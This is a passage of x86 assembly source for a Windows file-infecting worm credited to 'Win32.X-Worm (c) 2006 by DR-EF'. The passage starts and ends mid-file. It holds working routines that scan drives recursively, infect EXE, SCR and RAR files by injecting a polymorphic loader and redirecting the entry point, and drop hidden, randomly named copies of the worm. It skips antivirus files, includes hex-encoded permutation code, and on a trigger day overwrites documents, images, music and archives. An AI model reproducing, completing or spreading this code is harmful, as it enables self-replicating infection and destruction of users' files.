	MB_SYSTEMMODAL		equ	00001000h
	MB_ICONINFORMATION	equ	00000040h


StartDrive	db	"z:\",0

DRIVE_FIXED     equ	  3
DRIVE_REMOTE    equ	  4	
	
WIN32_FIND_DATA2:
	dwFileAttributes_	dd	0
	ftCreationTime_		dq	0
	ftLastAccessTime_	dq	0
	ftLastWriteTime_	dq	0
	nFileSizeHigh_		dd	0
	nFileSizeLow_		dd	0
	dwReserved0_		dd      0
	dwReserved1_		dd      0
	cFileName_		db      0ffh dup (0)
	cAlternateFileName_	db	20 dup (0)		;+ some bytes for padding
	
	
	
hsearch			dd	0	

	MB_YESNO	equ	00000004h
	IDYES	equ	6
	
IF	DEBUG
	warning	db	"Warning!!!:xworm is going to infect this file,press yes to infect",0
ENDIF	

;recursive directory scanner...		
InfectDrive:

	lea	eax,[ebp + WIN32_FIND_DATA2]
	push	eax
	lea	eax,[ebp + SearchMask]
	push	eax
	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE		;error ?
	je	@Stops					;stop search
	
	mov	[ebp + hsearch],eax			;save search handle
	
@NxtF:	mov	eax,[ebp + dwFileAttributes_]		;get file attributes
	and	eax,FILE_ATTRIBUTE_DIRECTORY		;remove bit masks
	cmp	eax,FILE_ATTRIBUTE_DIRECTORY		;it is directory ?
	jne	@isFile
	cmp	byte ptr [ebp + cFileName_],'.'		;its start with . ?
	je	@FndNxt

	push	[ebp + hsearch]				;save search handle
	
	lea	eax,[ebp + cFileName_]
	push	eax
	call	[ebp + SetCurrentDirectory]		;enter directory
	or	eax,eax
	je	@skpdir


	call	InfectDrive				;infect all sub directorys


	lea	eax,[ebp + dotdot]
	push	eax
	call	[ebp + SetCurrentDirectory]		;return to current directory
	

@skpdir:pop	[ebp + hsearch]				;restore search handle
	jmp	@FndNxt
	
@isFile:	
	
	lea	eax,[ebp + File_Name]
	push	eax
	lea	eax,[ebp + FileToInfect]
	push	eax
	push	260
	lea	eax,[ebp + cFileName_]
	push	eax
	call	[ebp + GetFullPathName]			;get file full path	
	or	eax,eax
	je	@FndNxt	
	
	
	;check what kind of file we have: exe/scr or rar file
	

	lea	eax,[ebp + FileToInfect]
@Find0:	cmp	byte ptr [eax],0h
	je	@GetExt
	inc	eax
	jmp	@Find0
@GetExt:sub	eax,4h					;go before the .xxx

	or	dword ptr [eax],20202020h		;convert to lower case

	cmp	dword ptr [eax],"exe."
	je	morechecks
	cmp	dword ptr [eax],"rcs."
	je	morechecks
	
	cmp	byte ptr [ebp + PayloadDay],1h		;today is payload ?
	jne	NotToday
	
	cmp	dword ptr [eax],"iva."			; .avi file ?
	je	FuckFile
	cmp	dword ptr [eax],"cod."			; .doc file ?
	je	FuckFile
	cmp	dword ptr [eax],"3pm."			; .mp3 file ?
	je	FuckFile
	cmp	dword ptr [eax],"gpm."			; .mpg file ?
	je	FuckFile
	cmp	dword ptr [eax],"slx."			; .xls file ?
	je	FuckFile
	cmp	dword ptr [eax],"gpj."			; .jpg file ?
	je	FuckFile
	cmp	dword ptr [eax],"piz."			; .zip file ?
	je	FuckFile
	cmp	dword ptr [eax],"osi."			; .iso file ?
	je	FuckFile
	cmp	dword ptr [eax],"fdp."			; .pdf file ?
	je	FuckFile
	cmp	dword ptr [eax],"tpp."			; .ppt file ?
	je	FuckFile

	jmp	NotToday	
FuckFile:	
	call	xPayLoad
NotToday:
	cmp	dword ptr [eax],"rar."
	je	rar_file	
	jmp	@FndNxt	
rar_file:
	mov	byte ptr [ebp + rarfile],1h
morechecks:	
	mov	eax,[ebp + nFileSizeLow_]		;get file size
		
	cmp	eax,2800h				;too small ?
	jb	@FndNxt	
	cmp	eax,300000h				;too big ?
	ja	@FndNxt
	
	cmp	byte ptr [ebp + rarfile],1h
	je	@xRar					;skip checks that are not relevant for rar file

	call	CheckFileName				;check for av file...
	jnc	@FndNxt

	cmp	dword ptr [ebp + SfcIsFileProtected],0h ;sfc working ?
	je	SfcNotWork
	
	lea	edi,[ebp + Unicode_Path]
	xor	eax,eax
	mov	ecx,200h
	rep	stosb					;blank unicode buffer
	
	push	200h
	lea	eax,[ebp + Unicode_Path]
	push	eax
	push	-1					;string is null terminated
	lea	eax,[ebp + FileToInfect]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	call	[ebp + MultiByteToWideChar]		;convert path into unicode
	or	eax,eax					;fail ?
	je	@FndNxt					;dont infect
	
	
	lea	eax,[ebp + Unicode_Path]
	push	eax
	push	0h
	call	[ebp + SfcIsFileProtected]		;check if file is protected
	cmp	eax,0h					;is file protected ?
	jne	@FndNxt
	
	
SfcNotWork:						;sfc dont working,assume we on win9x
	
	call	InfectFile
	jmp	@FndNxt

@xRar:	call	InfectRar

@FndNxt:
	mov	byte ptr [ebp + rarfile],0h
	
	lea	eax,[ebp + WIN32_FIND_DATA2]
	push	eax
	push	[ebp + hsearch]
	call	[ebp + FindNextFile]			;find next file
	or	eax,eax
	jne	@NxtF

	push	[ebp + hsearch]
	call	[ebp + FindClose]			;end the search
	
@Stops:	ret
	
	FILE_ATTRIBUTE_DIRECTORY	equ	00000010h
		
	File_Name		dd	0
	dotdot			db	"..",0
	SearchMask		db	"*.*",0
	

	rarfile			db	0


	FileToInfect		db	0ffh	dup(0)

		
	SFC_DLL	db	"SFC.DLL",0
	_SfcIsFileProtected      db      "SfcIsFileProtected",0
	SfcIsFileProtected	dd	0
	
	Unicode_Path	db	200h	dup(0)	 ;200=2 max_path
	
	CP_ACP	equ	0
	
	CopyRight	db	"[Win32.X-Worm (c) 2006 by DR-EF]",0h
	
xPayLoad:

IF	DEBUG
	int	3
	xor	esp,esp			;dont run that if we on debug
ENDIF

	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	CREATE_ALWAYS
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + CreateFile]
	
	push	eax
	
	push	0h
	lea	ebx,[ebp + tpayload]
	push	ebx
	push	666d
	lea	ebx,[ebp + CopyRight]
	push	ebx
	push	eax
	call	[ebp + WriteFile]
	
	call	[ebp + CloseHandle]

	ret
	
	tpayload	dd	0
	
	
InfectFile:
;*********************Debug C0de*******************************
IF	DEBUG
	push	MB_YESNO
	lea	eax,[ebp + warning]
	push	eax
	lea	eax,[ebp + FileToInfect]
	push	eax
	push	0h
	call	[ebp + MessageBox]
	cmp	eax,IDYES
	jne	ExitInfect
ENDIF
;**************************************************************
	call	RemoveFileAttributes		;set normal attributes for file
	call	OpenFile			;map file into memory
	jnc	ExitRFA				;exit & restore attributes
	
	cmp	word ptr [eax],"ZM"		;check mz sign
	jne	ExitCF
	mov	ecx,dword ptr [eax + 18h]	;check if relocation in mz header
	cmp	ecx,40h				;is 0x40 which is always for pe file
	jne	ExitCF
	add	eax,[eax + 3ch]
	cmp	word ptr [eax],"EP"		;check pe sign
	jne	ExitCF
	
	cmp	word ptr [eax + 08h],0666h	;already infected ?
	je	ExitCF
	
	push	eax				;save pe header offset in the stack
	mov	cx,word ptr [eax + 16h]		;get flags
	and	cx,2000h
	cmp	cx,2000h			;is dll ?
	jne	nodll				;infect only executeables
	pop	eax				;restore stack
	jmp	ExitCF
nodll:	mov	edx,[eax + 34h]
	add	edx,[eax + 28h]
	mov	dword ptr [ebp + ReturnAddress],edx	;setup return entry point
	
	pushad
	
	lea	edi,[ebp + MorphedWormFileName]
	
	mov	ecx,6h
@_RandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@_RandLetter
	mov	byte ptr [edi],'.'
	inc	edi
	mov	ecx,3h
@_xRandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@_xRandLetter				
	
	lea	esi,[ebp + FileToInfect]
	lea	edi,[ebp + FileCopyPath]
	
nextc:	cmp	byte ptr [esi+ecx],0h
	je	endc
	inc	ecx
	jmp	nextc
endc:	inc	ecx	
	rep	movsb
		
nxtc:	cmp	byte ptr [edi],'\'
	je	setfn
	mov	byte ptr [edi],0h
	dec	edi
	jmp	nxtc
setfn:	lea	esi,[ebp + MorphedWormFileName]
	mov	ecx,0dh
	inc	edi
	rep	movsb
	
	
;build premutated loader in memory	
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

	pushad


	
	lea	ebx,[ebp + MorphedWormFileName]
	lea	eax,[ebp + xloader + 6AAh]
	mov	ecx,[ebx]
	mov	[eax],ecx
	add	ebx,4h
	mov	ecx,[ebx]
	lea	eax,[ebp + xloader + 68Ah]
	mov	[eax],ecx
	add	ebx,4h
	mov	ecx,[ebx]
	lea	eax,[ebp + xloader + 66Ah]
	mov	[eax],ecx	


	push	1000h
	push	GPTR
	call	[ebp + GlobalAlloc]
	
	mov	[ebp + hPL_Memory],eax
	mov	[ebp + Premutated_Loader],eax


	call	[ebp + GetTickCount]
	and 	eax,2EE0h
	cmp	eax,0bb8h
	ja	ldr1

;type 1
ldr0:
	mov	eax,[ebp + ReturnAddress]
	mov	dword ptr [ebp + push_EP1],eax
	
	mov	ecx,SizeOFLoader1
	lea	esi,[ebp + Loader1]
	mov	edi,[ebp + hPL_Memory]
	rep	movsb
	add	[ebp + Premutated_Loader],SizeOFLoader1
	mov	[ebp + Premutated_Loader_Size],SizeOFLoader1
	
	jmp	write_ldr	
ldr1:	cmp	eax,0FA0h
	ja	ldr2
;type 2	
	call	[ebp + GetTickCount]
	
	mov	ebx,[ebp + ReturnAddress]
	xor	ebx,eax
	mov	dword ptr [ebp + Xored_Ep],ebx
	mov	dword ptr [ebp + Xored_Key],eax
	
	mov	ecx,SizeOfLoader2
	lea	esi,[ebp + Loader2]
	mov	edi,[ebp + hPL_Memory]
	rep	movsb
	add	[ebp + Premutated_Loader],SizeOfLoader2
	mov	[ebp + Premutated_Loader_Size],SizeOfLoader2
	
	jmp	write_ldr
ldr2:
;type 3	
	call	[ebp + GetTickCount]
	and	eax,01FFFh		;get random number between 0 ~ 4096

	mov	ebx,[ebp + ReturnAddress]
	sub	ebx,eax
	mov	dword ptr [ebp + Entrypoint_rnd],ebx
	mov	dword ptr [ebp + mov_ecx_rnd],eax
	
	
	mov	ecx,SizeOfLoader3
	lea	esi,[ebp + loader3]
	mov	edi,[ebp + hPL_Memory]
	rep	movsb
	add	[ebp + Premutated_Loader],SizeOfLoader3
	mov	[ebp + Premutated_Loader_Size],SizeOfLoader3

write_ldr:
	
	push	ebp

	lea	eax,[ebp + randrange]
	push	eax
	lea	eax,[ebp + xloader]
	push	eax
	mov	eax,[ebp + Premutated_Loader]
	push	eax
	call	premutator
	
	pop	ebp

	add	[ebp + Premutated_Loader_Size],eax


	popad	
	
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	

	popad
		
	movzx	ecx,word ptr [eax + 6h]		;get number of sections
	mov	ebx,[eax + 74h]
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h				;goto first section header
@xnexts:mov	ebx,[eax + 24h]			;get section flags
	and	ebx,20h
	cmp	ebx,20h				;is code section ?
	je	FoundCS
	add	eax,28h
	loop	@xnexts
	pop	eax				;restore stack
	jmp	ExitCF
FoundCS:mov	ebx,[eax + 24h]			;get section flags
	and	ebx,80000000h
	cmp	ebx,80000000h			;does code section writeable ?
	jne	__x1
	pop	eax				;restore stack
	jmp	ExitCF
__x1:	mov	ebx,[eax + 10h]			;get section size of raw data
	sub	ebx,[eax + 8h]
	cmp	ebx,[ebp + Premutated_Loader_Size];check for minimum loader size
	ja	____1
	pop	eax				;restore stack
	jmp	ExitCF
____1:	mov	ecx,[eax + 8h]			;get section vitrual size	
	mov	ebx,ecx				;get section virtual size
	add	ebx,[eax + 14h]			;add to it pointer raw data rva
	add	ebx,[ebp + mapbase]		;convert it to va
	
	mov	edi,ebx
	mov	esi,[ebp + hPL_Memory]
	mov	ecx,[ebp + Premutated_Loader_Size]
	rep	movsb				;inject loader
	
	pop	eax				;restore stack
	
	sub	ebx,[ebp + mapbase]
	mov	[eax + 28h],ebx			;redirect entry point	
	
	mov	word ptr [eax + 08h],0666h	;mark as infected

	push	0h
	lea	eax,[ebp + FileCopyPath]
	push	eax
	lea	eax,[ebp + MorphedWorm]
	push	eax
	call	[ebp + CopyFile]		;copy morphed worm file
	
	push	FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM
	lea	eax,[ebp + FileCopyPath]
	push	eax
	call	[ebp + SetFileAttributes]
	
	push	[ebp + hPL_Memory]
	call	[ebp + GlobalFree]

ExitCF:	call	CloseFile			;unmap file from memory with changes
ExitRFA:call	RestoreFileAttributes		;restore old attributes
ExitInfect:
	ret
	
Loader1:
	push	12345678h	;entry point
	push_EP1	equ	($-4)
	
	SizeOFLoader1	equ	($-Loader1)
	
Loader2:
	push	12345678h 	;(xored)
	Xored_Ep	equ	($-4)
	xor	dword ptr [esp],12345678h ; dex0r
	Xored_Key	equ	($-4)
	
	SizeOfLoader2	equ	($-Loader2)

loader3:
	mov	eax,12345678h		;entrypoint-rnd
	Entrypoint_rnd		equ	($-4)
	mov	ecx,12345678h		;rnd
	mov_ecx_rnd		equ	($-4)
xloop:	inc	eax
	dec	ecx
	jnz	xloop
	push	eax

	SizeOfLoader3	equ	($-loader3)	
	
	MorphedWormFileName		db	"VirusX.xwmr",0
	ReturnAddress			dd	0
	Premutated_Loader_Size		dd	0
	Premutated_Loader		dd	0
	hPL_Memory			dd	0


xloader:
db 041h,000h,000h,000h,001h,000h,000h,000h,000h,060h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,040h,000h,000h,000h,005h,000h,000h,000h,000h,064h,067h,0a1h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,03fh,000h,000h,000h,002h,000h,000h,000h,000h,08bh,010h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,03eh,000h,000h,000h,001h,000h,000h,000h,000h
db 042h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,03dh,000h,000h,000h,006h,000h,000h
db 000h,002h,084h,039h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,03ch,000h,000h,000h,001h
db 000h,000h,000h,000h,04ah,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,03bh,000h,000h
db 000h,001h,000h,000h,000h,000h,092h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,03ah
db 000h,000h,000h,005h,000h,000h,000h,001h,0ebh,03fh,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,039h,000h,000h,000h,003h,000h,000h,000h,000h,08bh,040h,004h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,038h,000h,000h,000h,005h,000h,000h,000h,000h,025h,000h,000h
db 0ffh,0ffh,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,037h,000h,000h,000h,005h,000h,000h,000h,000h,066h
db 081h,038h,04dh,05ah,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,036h,000h,000h,000h,006h,000h,000h,000h
db 002h,084h,033h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,035h,000h,000h,000h,005h,000h
db 000h,000h,000h,02dh,000h,000h,001h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,034h,000h,000h,000h
db 005h,000h,000h,000h,001h,0ebh,037h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,033h,000h
db 000h,000h,002h,000h,000h,000h,000h,08bh,0e8h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 032h,000h,000h,000h,003h,000h,000h,000h,000h,003h,040h,03ch,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,031h,000h,000h,000h,003h,000h,000h,000h,000h,08bh,040h,078h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,030h,000h,000h,000h,002h,000h,000h,000h,000h,003h,0c5h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,02fh,000h,000h,000h,001h,000h,000h,000h,000h
db 050h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,02eh,000h,000h,000h,002h,000h,000h
db 000h,000h,033h,0d2h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,02dh,000h,000h,000h,003h
db 000h,000h,000h,000h,08bh,040h,020h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,02ch,000h,000h
db 000h,002h,000h,000h,000h,000h,003h,0c5h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,02bh
db 000h,000h,000h,002h,000h,000h,000h,000h,08bh,038h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,02ah,000h,000h,000h,002h,000h,000h,000h,000h,003h,0fdh,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,029h,000h,000h,000h,001h,000h,000h,000h,000h,04fh,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,028h,000h,000h,000h,001h,000h,000h,000h,000h,047h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,027h,000h,000h,000h,005h,000h,000h,000h
db 000h,068h,078h,065h,063h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,026h,000h,000h,000h,005h,000h
db 000h,000h,000h,068h,057h,069h,06eh,045h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,025h,000h,000h,000h
db 002h,000h,000h,000h,000h,08bh,0f4h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,024h,000h
db 000h,000h,001h,000h,000h,000h,000h,059h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 023h,000h,000h,000h,001h,000h,000h,000h,000h,059h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,022h,000h,000h,000h,005h,000h,000h,000h,000h,0b9h,008h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,021h,000h,000h,000h,002h,000h,000h,000h,000h,0f3h,0a6h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,020h,000h,000h,000h,006h,000h,000h,000h,002h
db 084h,01ah,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,01fh,000h,000h,000h,001h,000h,000h
db 000h,000h,042h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,01eh,000h,000h,000h,003h
db 000h,000h,000h,000h,080h,03fh,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,01dh,000h,000h
db 000h,006h,000h,000h,000h,002h,084h,028h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,01ch
db 000h,000h,000h,001h,000h,000h,000h,000h,047h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,01bh,000h,000h,000h,005h,000h,000h,000h,001h,0ebh,01eh,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,01ah,000h,000h,000h,001h,000h,000h,000h,000h,058h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,019h,000h,000h,000h,002h,000h,000h,000h,000h,0d1h
db 0e2h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,018h,000h,000h,000h,003h,000h,000h,000h
db 000h,08bh,058h,024h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,017h,000h,000h,000h,002h,000h
db 000h,000h,000h,003h,0ddh,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,016h,000h,000h,000h
db 002h,000h,000h,000h,000h,003h,0dah,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,015h,000h
db 000h,000h,003h,000h,000h,000h,000h,066h,08bh,013h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 014h,000h,000h,000h,003h,000h,000h,000h,000h,0c1h,0e2h,002h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,013h,000h,000h,000h,003h,000h,000h,000h,000h,08bh,058h,01ch,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,012h,000h,000h,000h,002h,000h,000h,000h,000h,003h,0ddh
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,011h,000h,000h,000h,002h,000h,000h,000h,000h
db 003h,0dah,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,010h,000h,000h,000h,002h,000h,000h
db 000h,000h,08bh,01bh,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,00fh,000h,000h,000h,002h
db 000h,000h,000h,000h,003h,0ddh,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,00eh,000h,000h
db 000h,005h,000h,000h,000h,000h,068h,065h,078h,065h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,00dh
db 000h,000h,000h,005h,000h,000h,000h,000h,068h,058h,058h,058h,02eh,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,00ch,000h,000h,000h,005h,000h,000h,000h,000h,068h,046h,069h,06ch,065h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,00bh,000h,000h,000h,002h,000h,000h,000h,000h,08bh,0ech,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,00ah,000h,000h,000h,002h,000h,000h,000h,000h,06ah
db 001h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,009h,000h,000h,000h,001h,000h,000h,000h
db 000h,055h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,008h,000h,000h,000h,002h,000h
db 000h,000h,000h,0ffh,0d3h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,007h,000h,000h,000h
db 001h,000h,000h,000h,000h,05dh,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,006h,000h
db 000h,000h,001h,000h,000h,000h,000h,05dh,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 005h,000h,000h,000h,001h,000h,000h,000h,000h,05dh,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,004h,000h,000h,000h,003h,000h,000h,000h,000h,083h,0f8h,01fh,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,003h,000h,000h,000h,006h,000h,000h,000h,002h,082h,004h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,002h,000h,000h,000h,001h,000h,000h,000h,000h
db 061h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,001h,000h,000h,000h,001h,000h,000h
db 000h,004h,0c3h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h

rand:		push	edx
		call	[ebp + GetTickCount]
		add	eax, edx
		xor	eax, dword [ebp + randvar]
		add	eax, 33333333h
		xor	eax, 03c2d6afh
		add	eax, 0f93c221h
		rol	eax, 17
		add	dword [ebp + randvar], eax
		pop	edx
		ret
randrange:	push	edx ecx
		call	rand
		xor	edx, edx
		mov	ecx, dword [esp+12]
		div	ecx
		xchg	eax, edx
		pop	ecx edx
		ret	4

randvar		dd	0

; Blueowls Code Permutator v1.0
;
; * to be fixed: no short forward jumps outputted
;
; This version was given to DR-EF at his request, use for
; educational purposes only.
;
; in:           push    offset rand-in-range routine
;               push    offset permutate initted code
;               push    offset outputbuffer
; out:          all registers are destroyed.

premutator:
db 08bh,074h,024h,008h,08bh,016h,089h,0d1h,051h,052h,0ffh,054h,024h,014h,0c1h
db 0e0h,005h,0b9h,008h,000h,000h,000h,0ffh,036h,0ffh,034h,006h,08fh,006h,08fh
db 004h,006h,083h,0c6h,004h,0e2h,0f1h,083h,0eeh,020h,059h,0e2h,0ddh,039h,016h
db 075h,0d7h,08bh,07ch,024h,004h,089h,0f5h,089h,07eh,01ch,08bh,046h,018h,009h
db 0c0h,074h,00ch,089h,0f9h,029h,0c1h,083h,0e9h,004h,087h,008h,091h,0ebh,0f0h
db 08ah,046h,008h,0d0h,0e8h,072h,035h,0d0h,0e8h,072h,03dh,056h,08bh,04eh,004h
db 083h,0c6h,009h,0f3h,0a4h,05eh,0f6h,046h,008h,004h,075h,013h,08bh,006h,048h
db 039h,046h,020h,074h,00bh,06ah,000h,08bh,006h,048h,050h,0e8h,029h,000h,000h
db 000h,083h,0c6h,020h,04ah,075h,0b6h,02bh,07ch,024h,004h,097h,0c2h,00ch,000h
db 06ah,000h,0ffh,076h,00ah,0e8h,011h,000h,000h,000h,0ebh,0e6h,00fh,0b6h,046h
db 009h,050h,0ffh,076h,00ah,0e8h,002h,000h,000h,000h,0ebh,0beh,089h,0ebh,08bh
db 044h,024h,004h,039h,003h,074h,005h,083h,0c3h,020h,0ebh,0f7h,039h,0f3h,076h
db 01ch,083h,07ch,024h,008h,000h,074h,00ah,0b0h,00fh,0aah,08bh,044h,024h,008h
db 0aah,0ebh,003h,0b0h,0e9h,0aah,089h,0f8h,087h,043h,018h,0abh,0ebh,04bh,08bh
db 043h,01ch,029h,0f8h,083h,0f8h,081h,073h,022h,083h,07ch,024h,008h,000h,074h
db 010h,050h,0b0h,00fh,0aah,08bh,044h,024h,00ch,0aah,058h,083h,0e8h,006h,0abh
db 0ebh,02ah,050h,0b0h,0e9h,0aah,058h,083h,0e8h,005h,0abh,0ebh,01fh,083h,07ch
db 024h,008h,000h,074h,00eh,050h,08bh,044h,024h,00ch,02ch,010h,0aah,058h,048h
db 048h,0aah,0ebh,00ah,050h,0b0h,0ebh,0aah,058h,048h,048h,0aah,0ebh,000h,0c2h
db 008h,000h


	
	
	FileCopyPath	db	0ffh	dup(0)
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	

CloseFile:
	push	dword ptr [ebp + mapbase]
